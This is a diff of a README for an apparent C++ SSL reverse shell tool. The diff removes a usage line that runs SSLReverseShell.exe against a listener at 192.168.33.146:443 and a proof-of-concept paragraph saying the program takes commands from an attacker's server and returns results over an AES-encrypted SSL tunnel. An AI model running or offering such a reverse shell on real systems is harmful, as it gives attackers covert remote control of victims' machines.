@@ -72,18 +72,6 @@ C:\OpenSSLWin64\install\lib\libcrypto.lib
 ![Local Image](./images/Linker2.png "Linker.png")
 
 ---
-## Usage
-
-```
-.\SSLReverseShell.exe 192.168.33.146 443
-```
-
----
-## POC
-
-This C++ Project will connect to the python server and initiate a ssl connection, taking commands from the server (attacker) and sending the results to the attacker through ssl tunnel encrypted with aes.
-
----
 
 ## Capture the reverse shell in your Kali OS
 
